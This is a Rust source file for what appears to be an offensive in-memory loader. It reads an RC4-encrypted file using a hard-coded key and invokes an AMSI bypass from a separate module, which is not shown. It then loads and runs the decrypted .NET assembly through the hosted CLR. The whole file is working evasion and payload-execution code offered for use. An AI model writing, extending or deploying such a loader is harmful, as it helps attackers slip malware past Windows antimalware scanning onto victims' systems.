pub mod amsi;

use clroxide::clr::Clr;
use rc4::{KeyInit, Rc4, StreamCipher};
use std::process;
use std::{env, process::exit};
use std::{fs::File, io::Read};
fn prepare_args() -> (String, Vec<String>) {
    let mut args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        println!("[!] Usage: {} <Encrypted File> <Arguments>", args[0]);
        exit(0)
    }

    let mut command_args: Vec<String> = vec![];

    if args.len() > 2 {
        command_args = args.split_off(2)
    }

    let path = args[1].clone();

    println!("[+] Running {} with args: {:?}", path, command_args);

    return (path, command_args);
}

fn read_file(filename: &str) -> Vec<u8> {
    let mut file = File::open(filename).expect("Failed to open file");
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)
        .expect("Failed to read file");
    contents
}

fn decrypt_rc4(filename: &str) -> Vec<u8> {
    let mut buf = read_file(filename);
    let mut rc4 = Rc4::new(b"Superrandompass123".into());

    rc4.apply_keystream(&mut buf);

    buf
}

pub fn start_loader() -> Result<(), String> {
    let (path, args) = prepare_args();

    match amsi::setup_bypass() {
        Ok(_) => {
            let shellcode = decrypt_rc4(&path);
            let mut clr = Clr::new(shellcode, args)?;
            let results = clr.run().expect("[-] Unable to run CLR");
            println!("[+] Results:\n\n{}", results);
            process::exit(0);
        }
        Err(err_msg) => {
            println!("Error during verification: {}", err_msg);
        }
    }
    Ok(())
}